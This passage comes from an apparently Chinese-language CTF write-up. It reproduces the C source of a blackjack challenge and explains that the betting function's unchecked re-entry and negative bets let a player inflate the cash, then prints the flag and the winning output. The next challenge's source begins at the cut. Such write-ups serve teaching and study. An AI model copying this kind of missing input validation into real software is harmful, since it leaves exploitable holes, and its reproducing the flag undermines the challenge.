     <span class="token keyword">if</span><span class="token punctuation">(</span>random_card<span class="token operator">==</span><span class="token number">4</span><span class="token punctuation">)</span>
     <span class="token punctuation">{</span>
         <span class="token function">spadecard</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
         l<span class="token operator">=</span>k<span class="token punctuation">;</span>
     <span class="token punctuation">}</span>    
     <span class="token keyword">return</span> l<span class="token punctuation">;</span>
<span class="token punctuation">}</span> <span class="token comment" spellcheck="true">// End Function   </span>

<span class="token keyword">void</span> <span class="token function">play</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//Plays game</span>
<span class="token punctuation">{</span>

     <span class="token keyword">int</span> p<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// holds value of player_total</span>
     <span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// counter for asking user to hold or stay (aka game turns)</span>
     <span class="token keyword">char</span> choice3<span class="token punctuation">;</span>

     cash <span class="token operator">=</span> cash<span class="token punctuation">;</span>
     <span class="token function">cash_test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
     <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nCash: $%d\n"</span><span class="token punctuation">,</span>cash<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//Prints amount of cash user has</span>
     <span class="token function">randcard</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//Generates random card</span>
     player_total <span class="token operator">=</span> p <span class="token operator">+</span> l<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//Computes player total</span>
     p <span class="token operator">=</span> player_total<span class="token punctuation">;</span>
     <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nYour Total is %d\n"</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//Prints player total</span>
     <span class="token function">dealer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//Computes and prints dealer total</span>
     <span class="token function">betting</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//Prompts user to enter bet amount</span>

     <span class="token keyword">while</span><span class="token punctuation">(</span>i<span class="token operator">&lt;=</span><span class="token number">21</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//While loop used to keep asking user to hit or stay at most twenty-one times</span>
                  <span class="token comment" spellcheck="true">//  because there is a chance user can generate twenty-one consecutive 1's</span>
     <span class="token punctuation">{</span>
         <span class="token keyword">if</span><span class="token punctuation">(</span>p<span class="token operator">==</span><span class="token number">21</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//If user total is 21, win</span>
         <span class="token punctuation">{</span>
             <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nUnbelievable! You Win!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
             won <span class="token operator">=</span> won<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>
             cash <span class="token operator">=</span> cash<span class="token operator">+</span>bet<span class="token punctuation">;</span>
             <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nYou have %d Wins and %d Losses. Awesome!\n"</span><span class="token punctuation">,</span> won<span class="token punctuation">,</span> loss<span class="token punctuation">)</span><span class="token punctuation">;</span>
             dealer_total<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>
             <span class="token function">askover</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
         <span class="token punctuation">}</span>

         <span class="token keyword">if</span><span class="token punctuation">(</span>p<span class="token operator">></span><span class="token number">21</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//If player total is over 21, loss</span>
         <span class="token punctuation">{</span>
             <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nWoah Buddy, You Went WAY over.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
             loss <span class="token operator">=</span> loss<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>
             cash <span class="token operator">=</span> cash <span class="token operator">-</span> bet<span class="token punctuation">;</span>
             <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nYou have %d Wins and %d Losses. Awesome!\n"</span><span class="token punctuation">,</span> won<span class="token punctuation">,</span> loss<span class="token punctuation">)</span><span class="token punctuation">;</span>
             dealer_total<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>
             <span class="token function">askover</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
         <span class="token punctuation">}</span>

         <span class="token keyword">if</span><span class="token punctuation">(</span>p<span class="token operator">&lt;=</span><span class="token number">21</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//If player total is less than 21, ask to hit or stay</span>
         <span class="token punctuation">{</span>         
             <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n\nWould You Like to Hit or Stay?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

             <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%c"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>choice3<span class="token punctuation">)</span><span class="token punctuation">;</span>
             <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token punctuation">(</span>choice3<span class="token operator">!=</span><span class="token string">'H'</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>choice3<span class="token operator">!=</span><span class="token string">'h'</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>choice3<span class="token operator">!=</span><span class="token string">'S'</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>choice3<span class="token operator">!=</span><span class="token string">'s'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// If invalid choice entered</span>
             <span class="token punctuation">{</span>                                                                           
                 <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                 <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Please Enter H to Hit or S to Stay.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                 <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%c"</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>choice3<span class="token punctuation">)</span><span class="token punctuation">;</span>
             <span class="token punctuation">}</span>


             <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span>choice3<span class="token operator">==</span><span class="token string">'H'</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token punctuation">(</span>choice3<span class="token operator">==</span><span class="token string">'h'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// If Hit, continues</span>
             <span class="token punctuation">{</span> 
                 <span class="token function">randcard</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                 player_total <span class="token operator">=</span> p <span class="token operator">+</span> l<span class="token punctuation">;</span>
                 p <span class="token operator">=</span> player_total<span class="token punctuation">;</span>
                 <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nYour Total is %d\n"</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span><span class="token punctuation">;</span>
                 <span class="token function">dealer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                  <span class="token keyword">if</span><span class="token punctuation">(</span>dealer_total<span class="token operator">==</span><span class="token number">21</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//Is dealer total is 21, loss</span>
                  <span class="token punctuation">{</span>
                      <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nDealer Has the Better Hand. You Lose.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                      loss <span class="token operator">=</span> loss<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>
                      cash <span class="token operator">=</span> cash <span class="token operator">-</span> bet<span class="token punctuation">;</span>
                      <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nYou have %d Wins and %d Losses. Awesome!\n"</span><span class="token punctuation">,</span> won<span class="token punctuation">,</span> loss<span class="token punctuation">)</span><span class="token punctuation">;</span>
                      dealer_total<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>
                      <span class="token function">askover</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                  <span class="token punctuation">}</span> 

                  <span class="token keyword">if</span><span class="token punctuation">(</span>dealer_total<span class="token operator">></span><span class="token number">21</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//If dealer total is over 21, win</span>
                  <span class="token punctuation">{</span>                      
                      <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nDealer Has Went Over!. You Win!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                      won <span class="token operator">=</span> won<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>
                      cash <span class="token operator">=</span> cash<span class="token operator">+</span>bet<span class="token punctuation">;</span>
                      <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nYou have %d Wins and %d Losses. Awesome!\n"</span><span class="token punctuation">,</span> won<span class="token punctuation">,</span> loss<span class="token punctuation">)</span><span class="token punctuation">;</span>
                      dealer_total<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>
                      <span class="token function">askover</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                  <span class="token punctuation">}</span>
             <span class="token punctuation">}</span>
             <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span>choice3<span class="token operator">==</span><span class="token string">'S'</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token punctuation">(</span>choice3<span class="token operator">==</span><span class="token string">'s'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// If Stay, does not continue</span>
             <span class="token punctuation">{</span>
                <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nYou Have Chosen to Stay at %d. Wise Decision!\n"</span><span class="token punctuation">,</span> player_total<span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token function">stay</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
             <span class="token punctuation">}</span>
          <span class="token punctuation">}</span>
             i<span class="token operator">++</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//While player total and dealer total are less than 21, re-do while loop </span>
     <span class="token punctuation">}</span> <span class="token comment" spellcheck="true">// End While Loop</span>
<span class="token punctuation">}</span> <span class="token comment" spellcheck="true">// End Function</span>

<span class="token keyword">void</span> <span class="token function">dealer</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//Function to play for dealer AI</span>
<span class="token punctuation">{</span>
     <span class="token keyword">int</span> z<span class="token punctuation">;</span>

     <span class="token keyword">if</span><span class="token punctuation">(</span>dealer_total<span class="token operator">&lt;</span><span class="token number">17</span><span class="token punctuation">)</span>
     <span class="token punctuation">{</span>
      <span class="token function">srand</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span><span class="token punctuation">)</span> <span class="token function">time</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//Generates random seed for rand() function</span>
      z<span class="token operator">=</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">13</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>
      <span class="token keyword">if</span><span class="token punctuation">(</span>z<span class="token operator">&lt;=</span><span class="token number">10</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//If random number generated is 10 or less, keep that value</span>
      <span class="token punctuation">{</span>
         d<span class="token operator">=</span>z<span class="token punctuation">;</span>

      <span class="token punctuation">}</span>

      <span class="token keyword">if</span><span class="token punctuation">(</span>z<span class="token operator">></span><span class="token number">11</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//If random number generated is more than 11, change value to 10</span>
      <span class="token punctuation">{</span>
         d<span class="token operator">=</span><span class="token number">10</span><span class="token punctuation">;</span>
      <span class="token punctuation">}</span>

      <span class="token keyword">if</span><span class="token punctuation">(</span>z<span class="token operator">==</span><span class="token number">11</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//If random number is 11(Ace), change value to 11 or 1 depending on dealer total</span>
      <span class="token punctuation">{</span>
         <span class="token keyword">if</span><span class="token punctuation">(</span>dealer_total<span class="token operator">&lt;=</span><span class="token number">10</span><span class="token punctuation">)</span>
         <span class="token punctuation">{</span>
             d<span class="token operator">=</span><span class="token number">11</span><span class="token punctuation">;</span>
         <span class="token punctuation">}</span>

         <span class="token keyword">else</span>
         <span class="token punctuation">{</span>
             d<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>
         <span class="token punctuation">}</span>
      <span class="token punctuation">}</span>
     dealer_total <span class="token operator">=</span> dealer_total <span class="token operator">+</span> d<span class="token punctuation">;</span>
     <span class="token punctuation">}</span>

     <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nThe Dealer Has a Total of %d"</span><span class="token punctuation">,</span> dealer_total<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//Prints dealer total</span>

<span class="token punctuation">}</span> <span class="token comment" spellcheck="true">// End Function </span>

<span class="token keyword">void</span> <span class="token function">stay</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//Function for when user selects 'Stay'</span>
<span class="token punctuation">{</span>
     <span class="token function">dealer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//If stay selected, dealer continues going</span>
     <span class="token keyword">if</span><span class="token punctuation">(</span>dealer_total<span class="token operator">>=</span><span class="token number">17</span><span class="token punctuation">)</span>
     <span class="token punctuation">{</span>
      <span class="token keyword">if</span><span class="token punctuation">(</span>player_total<span class="token operator">>=</span>dealer_total<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//If player's total is more than dealer's total, win</span>
      <span class="token punctuation">{</span>
         <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nUnbelievable! You Win!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
         won <span class="token operator">=</span> won<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>
         cash <span class="token operator">=</span> cash<span class="token operator">+</span>bet<span class="token punctuation">;</span>
         <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nYou have %d Wins and %d Losses. Awesome!\n"</span><span class="token punctuation">,</span> won<span class="token punctuation">,</span> loss<span class="token punctuation">)</span><span class="token punctuation">;</span>
         dealer_total<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>
         <span class="token function">askover</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token punctuation">}</span>
      <span class="token keyword">if</span><span class="token punctuation">(</span>player_total<span class="token operator">&lt;</span>dealer_total<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//If player's total is less than dealer's total, loss</span>
      <span class="token punctuation">{</span>
         <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nDealer Has the Better Hand. You Lose.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
         loss <span class="token operator">=</span> loss<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>
         cash <span class="token operator">=</span> cash <span class="token operator">-</span> bet<span class="token punctuation">;</span>
         <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nYou have %d Wins and %d Losses. Awesome!\n"</span><span class="token punctuation">,</span> won<span class="token punctuation">,</span> loss<span class="token punctuation">)</span><span class="token punctuation">;</span>
         dealer_total<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>
         <span class="token function">askover</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token punctuation">}</span>
      <span class="token keyword">if</span><span class="token punctuation">(</span>dealer_total<span class="token operator">></span><span class="token number">21</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//If dealer's total is more than 21, win</span>
      <span class="token punctuation">{</span>
         <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nUnbelievable! You Win!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
         won <span class="token operator">=</span> won<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>
         cash <span class="token operator">=</span> cash<span class="token operator">+</span>bet<span class="token punctuation">;</span>
         <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nYou have %d Wins and %d Losses. Awesome!\n"</span><span class="token punctuation">,</span> won<span class="token punctuation">,</span> loss<span class="token punctuation">)</span><span class="token punctuation">;</span>
         dealer_total<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>
         <span class="token function">askover</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token punctuation">}</span>
     <span class="token punctuation">}</span>
     <span class="token keyword">else</span>
     <span class="token punctuation">{</span>
         <span class="token function">stay</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
     <span class="token punctuation">}</span>

<span class="token punctuation">}</span> <span class="token comment" spellcheck="true">// End Function</span>

<span class="token keyword">void</span> <span class="token function">cash_test</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//Test for if user has cash remaining in purse</span>
<span class="token punctuation">{</span>
     <span class="token keyword">if</span> <span class="token punctuation">(</span>cash <span class="token operator">&lt;=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//Once user has zero remaining cash, game ends and prompts user to play again</span>
     <span class="token punctuation">{</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"You Are Bankrupt. Game Over"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        cash <span class="token operator">=</span> <span class="token number">500</span><span class="token punctuation">;</span>
        <span class="token function">askover</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
     <span class="token punctuation">}</span>
<span class="token punctuation">}</span> <span class="token comment" spellcheck="true">// End Function</span>

<span class="token keyword">int</span> <span class="token function">betting</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//Asks user amount to bet</span>
<span class="token punctuation">{</span>
 <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n\nEnter Bet: $"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>bet<span class="token punctuation">)</span><span class="token punctuation">;</span>

 <span class="token keyword">if</span> <span class="token punctuation">(</span>bet <span class="token operator">></span> cash<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//If player tries to bet more money than player has</span>
 <span class="token punctuation">{</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nYou cannot bet more money than you have."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nEnter Bet: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>bet<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> bet<span class="token punctuation">;</span>
 <span class="token punctuation">}</span>
 <span class="token keyword">else</span> <span class="token keyword">return</span> bet<span class="token punctuation">;</span>
<span class="token punctuation">}</span> <span class="token comment" spellcheck="true">// End Function</span>

<span class="token keyword">void</span> <span class="token function">askover</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// Function for asking player if they want to play again</span>
<span class="token punctuation">{</span>
    <span class="token keyword">char</span> choice1<span class="token punctuation">;</span>

     <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nWould You Like To Play Again?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
     <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nPlease Enter Y for Yes or N for No\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
     <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"\n%c"</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>choice1<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token punctuation">(</span>choice1<span class="token operator">!=</span><span class="token string">'Y'</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>choice1<span class="token operator">!=</span><span class="token string">'y'</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>choice1<span class="token operator">!=</span><span class="token string">'N'</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>choice1<span class="token operator">!=</span><span class="token string">'n'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// If invalid choice entered</span>
    <span class="token punctuation">{</span>                                                                           
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Incorrect Choice. Please Enter Y for Yes or N for No.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%c"</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>choice1<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>


    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span>choice1 <span class="token operator">==</span> <span class="token string">'Y'</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token punctuation">(</span>choice1 <span class="token operator">==</span> <span class="token string">'y'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// If yes, continue.</span>
    <span class="token punctuation">{</span> 
            <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"cls"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token function">play</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span>choice1 <span class="token operator">==</span> <span class="token string">'N'</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token punctuation">(</span>choice1 <span class="token operator">==</span> <span class="token string">'n'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// If no, exit program</span>
    <span class="token punctuation">{</span>
        <span class="token function">fileresults</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nBYE!!!!\n\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"pause"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">return</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span> <span class="token comment" spellcheck="true">// End function</span>

<span class="token keyword">void</span> <span class="token function">fileresults</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//Prints results into Blackjack.txt file in program directory</span>
<span class="token punctuation">{</span>
    FILE <span class="token operator">*</span>fpresults<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//File pointer is fpresults</span>
    fpresults <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span>RESULTS<span class="token punctuation">,</span> <span class="token string">"w"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//Creates file and writes into it</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span>fpresults <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// what to do if file missing from directory</span>
    <span class="token punctuation">{</span>
               <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nError: File Missing\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
               <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"pause"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
               <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">else</span>
    <span class="token punctuation">{</span>     
     <span class="token function">fprintf</span><span class="token punctuation">(</span>fpresults<span class="token punctuation">,</span><span class="token string">"\n\t RESULTS"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
     <span class="token function">fprintf</span><span class="token punctuation">(</span>fpresults<span class="token punctuation">,</span><span class="token string">"\n\t---------\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
     <span class="token function">fprintf</span><span class="token punctuation">(</span>fpresults<span class="token punctuation">,</span><span class="token string">"\nYou Have Won %d Times\n"</span><span class="token punctuation">,</span> won<span class="token punctuation">)</span><span class="token punctuation">;</span>
     <span class="token function">fprintf</span><span class="token punctuation">(</span>fpresults<span class="token punctuation">,</span><span class="token string">"\nYou Have Lost %d Times\n"</span><span class="token punctuation">,</span> loss<span class="token punctuation">)</span><span class="token punctuation">;</span>
     <span class="token function">fprintf</span><span class="token punctuation">(</span>fpresults<span class="token punctuation">,</span><span class="token string">"\nKeep Playing and Set an All-Time Record!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span> 
     <span class="token function">fclose</span><span class="token punctuation">(</span>fpresults<span class="token punctuation">)</span><span class="token punctuation">;</span>
     <span class="token keyword">return</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span> <span class="token comment" spellcheck="true">// End Function</span></code></pre>
<h3 id="分析-11"><a href="#分析-11" class="headerlink" title="分析"></a>分析</h3><p>问题主要出自betting函数</p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">betting</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//Asks user amount to bet</span>
<span class="token punctuation">{</span>
 <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n\nEnter Bet: $"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>bet<span class="token punctuation">)</span><span class="token punctuation">;</span>

 <span class="token keyword">if</span> <span class="token punctuation">(</span>bet <span class="token operator">></span> cash<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//If player tries to bet more money than player has</span>
 <span class="token punctuation">{</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nYou cannot bet more money than you have."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nEnter Bet: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>bet<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> bet<span class="token punctuation">;</span>
 <span class="token punctuation">}</span>
 <span class="token keyword">else</span> <span class="token keyword">return</span> bet<span class="token punctuation">;</span>
<span class="token punctuation">}</span> <span class="token comment" spellcheck="true">// End Function</span></code></pre>
<ol>
<li>选择在第二次输入时直接输1000000，无脑赌到赢</li>
<li>选择第一次输入-1000000，无脑赌到输</li>
</ol>
<p>因为最后计算金额时候，不是<code>cash = cash + bet;</code>就是<code>cash = cash - bet;</code>分别对应两种利用</p>
<h3 id="解题-11"><a href="#解题-11" class="headerlink" title="解题"></a>解题</h3><pre class=" language-shell"><code class="language-shell">YaY_I_AM_A_MILLIONARE_LOL


Cash: $1000500
-------
|H    |
|  2  |
|    H|
-------

Your Total is 2

The Dealer Has a Total of 10</code></pre>
<h2 id="13-lotto"><a href="#13-lotto" class="headerlink" title="13. lotto"></a>13. lotto</h2><h3 id="题目-12"><a href="#题目-12" class="headerlink" title="题目"></a>题目</h3><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;fcntl.h></span></span>

<span class="token keyword">unsigned</span> <span class="token keyword">char</span> submit<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

<span class="token keyword">void</span> <span class="token function">play</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>

    <span class="token keyword">int</span> i<span class="token punctuation">;</span>
